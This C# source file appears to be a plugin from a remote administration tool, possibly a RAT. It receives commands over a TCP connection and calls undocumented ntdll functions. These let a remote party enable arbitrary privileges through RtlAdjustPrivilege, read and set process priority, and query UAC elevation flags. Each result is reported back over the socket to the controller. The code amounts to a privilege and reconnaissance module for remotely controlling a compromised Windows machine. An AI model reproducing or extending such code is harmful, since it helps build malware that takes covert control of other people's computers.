using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Native.NtDll;
using static PacketLib.Packet;

namespace PL
{
    public class Main
    {
        public static PacketMaker P = new PacketMaker();
        public static Packet_Send Send = new Packet_Send();
        public unsafe static void main(TcpClient K, object[] Param_Tab)
        {

            Packet_Subject TypeSub = (Packet_Subject)Param_Tab[0];

            switch (TypeSub)
            {
                case Packet_Subject.GET_PRIV:

                    try
                    {
                        Native.NtDll.Enumerations._PRIVILEGES ToGet = (Native.NtDll.Enumerations._PRIVILEGES)Param_Tab[1];
                        bool t1;
                        NTSTATUS GetPriv = Native.NtDll.Functions.RtlAdjustPrivilege(ToGet, true, false, out t1);
                        P.Type_Packet = PacketType.PLUGIN_CS_RES;
                        P.Misc = new object[] { Packet_Subject.GET_PRIV, GetPriv, ToGet };
                        Send.Packet = P;

                        lock (K)
                        {
                            Send.Send(K.GetStream());
                        }
                    }
                    catch (Exception ex)
                    {
                        //  MessageBox.Show(ex.ToString());
                    }

                    break;

                case Packet_Subject.GET_PRIO:

                    IntPtr SizeOfData = (IntPtr)0x002;
                    int nLsength = 0;
                    void* DataPointer = (void*)0;
                    NTSTATUS Stat = Functions.NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, Enumerations._PROCESS_INFO_CLASS.ProcessPriorityClass, ref DataPointer, SizeOfData, out nLsength);   
                    P.Type_Packet = PacketType.PLUGIN_CS_RES;
                    P.Misc = new object[] { Packet_Subject.GET_PRIO, (Enumerations._PRIORITY_CLASS)((uint)DataPointer)};
                    Send.Packet = P;
                    {
                        Send.Send(K.GetStream());
                    }
                    break;

                case Packet_Subject.SET_PRIO:

                    Native.NtDll.Enumerations._PRIORITY_CLASS ToSet = (Native.NtDll.Enumerations._PRIORITY_CLASS)Param_Tab[1];
                    NTSTATUS SetPrio = Functions.NtSetInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, Enumerations._PROCESS_INFO_CLASS.ProcessPriorityClass, (IntPtr)ToSet, (IntPtr)0x002);
                    P.Type_Packet = PacketType.PLUGIN_CS_RES;
                    P.Misc = new object[] { Packet_Subject.SET_PRIO, SetPrio};
                    Send.Packet = P;
                    lock (K)
                    {
                        Send.Send(K.GetStream());
                    }
                    break;

                case Packet_Subject.CHECK_UAC:
                    uint p = 0;
                    NTSTATUS ChckUAC = Functions.RtlQueryElevationFlags(&p);
                    Enumerations.RtlQueryElevation_Flags Flags = (Enumerations.RtlQueryElevation_Flags)p;
                    P.Type_Packet = PacketType.PLUGIN_CS_RES;
                    P.Misc = new object[] { Packet_Subject.CHECK_UAC, Flags , p};
                    Send.Packet = P;
                    lock (K)
                    {
                        Send.Send(K.GetStream());
                    }
                    break;
            }


        
        }
    }
}
